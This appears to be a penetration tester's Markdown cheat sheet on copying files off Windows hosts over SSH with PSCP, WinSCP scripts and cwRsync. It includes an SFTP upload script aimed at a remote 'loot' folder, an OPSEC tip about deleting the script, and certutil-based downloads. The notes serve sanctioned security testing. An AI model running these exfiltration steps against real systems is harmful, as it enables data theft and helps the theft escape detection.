# SSH

## 01 - PSCP

```
C:\> pscp.exe -4 [-P <PORT>] -pw <password> <source> <username>@<IP>:<destination>
```

## 02 - WinSCP

TODO: Fill this info

```
C:\> copy con commands.txt
option batch continue
option confirm off
open sftp://<username>:<password>@<IP> -hostkey=<fingerprint> -rawsettings Compression=1
lcd "//<IP>/<share_name>/path/to/directory/"
cd "/mnt/<loot | downloads | backup>"
put "<directory>"
put -delete *.extension
# synchronize remote -criteria=size
exit
```

> [!IMPORTANT] OPSEC Consideration
> It's no longer required to keep the text file after it was executed in the background. It won't interrupt the process after deleting the file.

```
C:\> winscp.exe /script=commands.txt
```
## 03 - CwRsync

### 3.1 - Installation

#### 3.1.1 - Command Prompt

```
C:\> curl -o cwrsync.zip https://itefix.net/dl/free-software/cwrsync_6.2.8_x64_free.zip

C:\> certutil.exe -urlcache -split -f https://itefix.net/dl/free-software/cwrsync_6.2.8_x64_free.zip cwrsync.zip
```

Extract it then delete it.

```
C:\> tar.exe xf .\cwrsync.zip
del /f .\cwrsync.zip
```

#### 3.1.2 - PowerShell

```powershell
PS C:\> Invoke-Webrequest [-UseBasicParsing] -Uri https://itefix.net/dl/free-software/cwrsync_6.2.8_x64_free.zip -OutFile cwrsync.zip
Expand-Archive cwrsync.zip
Remove-Item cwrsync.zip
```

### 3.2 - Usage

```
C:\> cd cwrsync/bin/
```

```
C:\cwrsync/bin> .\rsync.exe
```

---
## References

### WinSCP

- [WinSCP: Command Line](https://winscp.net/eng/docs/commandline)

- [WinSCP: Guide Automation](https://winscp.net/eng/docs/guide_automation)

### CwRsync

- [CwRsync](https://www.itefix.net/cwrsync)